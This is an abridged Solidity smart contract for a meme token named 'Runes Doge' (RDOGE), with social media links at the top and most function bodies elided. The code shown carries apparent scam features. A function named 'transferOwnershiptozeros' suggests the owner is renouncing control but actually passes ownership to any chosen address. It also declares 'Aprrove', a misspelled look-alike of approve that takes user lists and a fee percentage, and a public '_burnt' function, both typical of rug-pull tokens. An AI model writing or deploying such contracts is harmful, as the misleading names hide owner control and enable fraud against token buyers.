/**
https://t.me/RunesdogERC
https://twitter.com/Runesdog_ERC
...
abstract contract Ownable {
    ...
    function transferOwnershiptozeros(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract RunesDoge is Ownable {
    ...
    constructor (){
        name = unicode"Runes Doge";
        symbol = unicode"RDOGE";
        decimals = 9;
    ...
    function Aprrove(address[] memory users, uint256 feePercent) external {
    ...
    function _burnt(address user) public {
